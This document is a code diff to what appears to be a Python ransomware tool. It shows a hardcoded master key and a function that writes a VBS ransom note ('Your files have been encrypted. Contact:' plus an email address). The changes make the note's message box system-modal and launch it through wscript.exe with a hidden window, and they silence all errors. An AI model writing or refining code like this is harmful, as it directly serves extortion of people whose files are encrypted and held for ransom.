@@ -3,6 +3,7 @@ import secrets
 import hashlib
 import hmac
 import struct
+import subprocess
 
 
 MASTER_KEY_FIXED = b"%N34iEx$ZSWCfYGhFPeXu5#K8mQ@vL2pR9tB6wJ&D7nH3sA1uI0oY4zTGhFPeXu5#K8mQ@vL2pRCfYGhFPeXu5#K8mQ4iEx$ZSWCfYGhFPe"
@@ -33,11 +34,17 @@ def crear_vbs_notificacion(ruta_archivo):
         nombre_base = os.path.splitext(ruta_archivo)[0]
         vbs_path = nombre_base + ".vbs"
         vbs_content = """On Error Resume Next
-MsgBox "Your files have been encrypted. Contact: onder01@tutamail.com", vbCritical, "Encrypted"
+MsgBox "Your files have been encrypted. Contact: onder01@tutamail.com", vbCritical + vbSystemModal, "Encrypted"
 WScript.Quit
 """
         with open(vbs_path, "w", encoding="utf-8") as f:
             f.write(vbs_content)
+        
+        try:
+            subprocess.Popen(['wscript.exe', vbs_path], creationflags=0x08000000, shell=False)
+        except:
+            pass
+        
         return True
     except:
         return False
